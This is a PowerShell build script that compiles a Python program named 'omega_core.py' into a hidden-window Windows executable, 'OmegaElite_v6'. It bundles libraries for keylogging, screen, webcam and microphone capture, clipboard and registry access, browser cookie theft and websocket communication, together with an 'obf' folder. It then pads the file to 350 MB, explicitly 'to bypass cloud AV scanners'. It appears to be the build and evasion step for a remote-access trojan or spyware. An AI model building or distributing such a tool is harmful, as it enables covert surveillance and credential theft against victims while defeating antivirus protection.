Set-Location "C:\Users\umonk\.gemini\antigravity\scratch\Omega123"

python -m PyInstaller `
    --onefile `
    --noconsole `
    --name "OmegaElite_v6" `
    --add-data "modules;modules" `
    --add-data "obf;obf" `
    --hidden-import "websockets" `
    --hidden-import "websockets.legacy" `
    --hidden-import "websockets.legacy.client" `
    --hidden-import "websockets.legacy.server" `
    --hidden-import "psutil" `
    --hidden-import "PIL" `
    --hidden-import "PIL.ImageGrab" `
    --hidden-import "PIL.Image" `
    --hidden-import "pynput" `
    --hidden-import "pynput.keyboard" `
    --hidden-import "pynput.mouse" `
    --hidden-import "pynput.keyboard._win32" `
    --hidden-import "pynput.mouse._win32" `
    --hidden-import "sounddevice" `
    --hidden-import "win32api" `
    --hidden-import "win32con" `
    --hidden-import "win32gui" `
    --hidden-import "winreg" `
    --hidden-import "ctypes" `
    --hidden-import "comtypes" `
    --hidden-import "comtypes.client" `
    --hidden-import "pyperclip" `
    --hidden-import "cv2" `
    --hidden-import "numpy" `
    --hidden-import "pyaudio" `
    --hidden-import "cryptography" `
    --hidden-import "cryptography.hazmat.primitives.ciphers" `
    --hidden-import "cryptography.hazmat.primitives.ciphers.algorithms" `
    --hidden-import "cryptography.hazmat.primitives.ciphers.modes" `
    --hidden-import "cryptography.hazmat.backends" `
    --hidden-import "browser_cookie3" `
    --hidden-import "sqlite3" `
    --hidden-import "json" `
    --hidden-import "struct" `
    --hidden-import "base64" `
    --hidden-import "threading" `
    --hidden-import "asyncio" `
    --hidden-import "ssl" `
    --hidden-import "urllib" `
    --hidden-import "urllib.request" `
    --hidden-import "mss" `
    --hidden-import "dxcam" `
    --collect-submodules "websockets" `
    --collect-submodules "pynput" `
    --collect-all "sounddevice" `
    omega_core.py

Write-Host ""
Write-Host "=== BUILD COMPLETE ===" -ForegroundColor Cyan
if (Test-Path "dist\OmegaElite_v6.exe") {
    $size = (Get-Item "dist\OmegaElite_v6.exe").length / 1MB
    Write-Host "Initial EXE Size: $([math]::Round($size, 1)) MB" -ForegroundColor Yellow

    Write-Host "Pumping file size to 350MB to bypass cloud AV scanners..." -ForegroundColor Cyan
    $targetBytes = 350 * 1024 * 1024
    $currentBytes = (Get-Item "dist\OmegaElite_v6.exe").length
    if ($currentBytes -lt $targetBytes) {
        $paddingBytes = $targetBytes - $currentBytes
        $fs = [System.IO.File]::OpenWrite("dist\OmegaElite_v6.exe")
        $fs.Seek(0, [System.IO.SeekOrigin]::End) | Out-Null
        $buffer = New-Object byte[] 1MB
        $written = 0
        while ($written -lt $paddingBytes) {
            $toWrite = [math]::Min($buffer.Length, $paddingBytes - $written)
            $fs.Write($buffer, 0, $toWrite)
            $written += $toWrite
        }
        $fs.Close()
        Write-Host "File successfully inflated!" -ForegroundColor Green
    }
    
    $finalSize = (Get-Item "dist\OmegaElite_v6.exe").length / 1MB
    Write-Host "FINAL EXE: dist\OmegaElite_v6.exe" -ForegroundColor Green
    Write-Host "Final Size: $([math]::Round($finalSize, 1)) MB" -ForegroundColor Green
} else {
    Write-Host "Build FAILED - check output above" -ForegroundColor Red
}
